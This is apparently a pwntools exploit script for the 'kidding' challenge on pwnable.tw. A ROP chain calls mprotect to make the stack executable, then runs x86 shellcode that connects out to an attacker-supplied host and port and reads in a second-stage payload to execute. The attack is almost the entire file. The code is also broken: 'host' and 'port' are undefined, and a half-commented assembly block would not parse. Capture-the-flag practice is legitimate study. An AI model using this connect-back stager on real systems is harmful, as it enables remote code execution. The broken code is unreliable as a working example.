from pwn import * 

p = process("./kidding")
gdb.attach(p, "b*0x0806F290")
# context.arch = 'i386'
# shellcode = asm("""
xor    ebx,ebx
mul    ebx
mov    al,0x66
inc    ebx
push   edx
push   ebx
push   0x2
mov    ecx,esp
int    0x80
pop ecx 
mov cl, 2
xchg   ebx,eax
mov    al,0x3f
int    0x80
mov    al,0x66
mov    ecx,esp
sub cl, 0xff
push   0x10
push   ecx
push   ebx
mov    ecx,esp
int    0x80

; read shellcode in to stack
xor eax, eax 
mov al, 3
xor ebx, ebx 
mov bl, 0 
sub cl, 0xff
mov dl, 0xff 
int 0x80
# """)

shellcode = "\x31\xDB\xF7\xE3\xB0\x66\x43\x52\x53\x6A\x02\x89\xE1\xCD\x80\x59\xB1\x02\x93\xB0\x3F\xCD\x80\xB0\x66\x89\xE1\x80\xE9\xFF\x6A\x10\x51\x53\x89\xE1\xCD\x80\x31\xC0\xB0\x03\x31\xDB\xB3\x00\x80\xE9\xFF\xB2\xFF\xCD\x80"

 
# p = remote("chall.pwnable.tw", 10303)

pop_edx = p32(0x0806ec8b) 
pop_ecx = p32(0x080583c9) 
pop_ebx = p32(0x080481c9) 
pop_eax = p32(0x080b8536) 
int_80 = p32(0x0806F290)
pop_ed_c_bx = p32(0x0806ecb0) 
push_esp = p32(0x080b8546)

payload = host + port # .... 
payload += pop_eax + p32(0x7d) 
payload += pop_ed_c_bx + p32(0x7) + p32(0x21000) + p32(0xfffdd000) 
payload += int_80
payload += push_esp
payload += shellcode 
print(len(payload))
assert len(payload) <= 100

p.send(payload)
p.interactive()

